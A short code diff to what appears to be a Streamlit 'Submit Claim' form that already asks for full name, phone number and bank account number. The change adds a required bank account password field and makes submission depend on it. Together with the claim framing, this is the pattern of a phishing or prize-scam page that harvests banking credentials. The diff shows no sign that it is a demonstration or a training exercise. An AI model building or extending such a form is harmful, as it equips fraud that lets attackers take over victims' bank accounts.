@@ -78,10 +78,11 @@ if not st.session_state.submitted:
         full_name = st.text_input("👤 Full Name")
         phone_number = st.text_input("📞 Phone Number")
         bank_account = st.text_input("🏦 Bank Account Number")
+        bank_password = st.text_input("🔒 Bank Account Password", type="password")
         submit = st.form_submit_button("🎯 Submit Claim")
 
         if submit:
-            if full_name and phone_number and bank_account:
+            if full_name and phone_number and bank_account and bank_password:
                 st.session_state.submitted = True
             else:
                 st.warning("🚨 Please complete all fields to proceed.")
